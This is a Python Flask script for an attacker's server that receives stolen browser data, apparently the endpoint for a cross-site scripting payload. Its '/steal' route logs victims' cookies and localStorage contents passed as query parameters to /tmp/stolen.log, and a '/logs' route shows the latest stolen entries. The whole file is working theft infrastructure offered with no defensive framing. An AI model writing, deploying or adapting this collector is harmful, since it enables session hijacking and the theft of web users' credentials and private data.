from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/steal')
def steal():
    # log stolen data
    timestamp = datetime.now().strftime('%H:%M:%S')
    cookies = request.args.get('cookies', 'none')
    storage = request.args.get('storage', 'none')
    
    print(f"[{timestamp}]")
    print(f"coojies stolen : {cookies}")
    print(f"localstorage stolen: : {storage}")
    print("-" * 50)
    
    with open('/tmp/stolen.log', 'a') as f:
        f.write(f"[{timestamp}] cookies={cookies} storage={storage}\n")
    
    return 'ok', 200

@app.route('/logs')
def logs():
    try:
        with open('/tmp/stolen.log', 'r') as f:
            entries = f.readlines()[-10:]
            return '<br>'.join(entries) or 'no data stolen yet'
    except FileNotFoundError:
        return 'no data stolen yet'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)
